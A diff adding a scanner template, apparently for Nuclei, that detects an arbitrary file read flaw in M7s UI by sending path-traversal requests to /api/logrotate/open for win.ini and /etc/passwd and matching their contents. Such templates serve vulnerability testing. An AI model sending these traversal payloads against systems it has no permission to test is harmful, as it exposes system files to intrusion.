@@ -1,0 +1,36 @@
+id: poc-yaml-m7s-ui-open-anyfile-read
+info:
+  name: M7s UI Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template checks for the arbitrary file read vulnerability in M7s UI by exploiting the open file functionality.
+http:
+  - raw:
+      - |
+        GET /api/logrotate/open?file=../C://Windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /api/logrotate/open?file=../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        condition: and
+        part: body
+
+      - type: word
+        words:
+          - "[files]"
+          - "bit app support"
+        condition: and
+        part: body
+    stop-at-first-match: true
+    redirects: false
+    max-redirects: 3
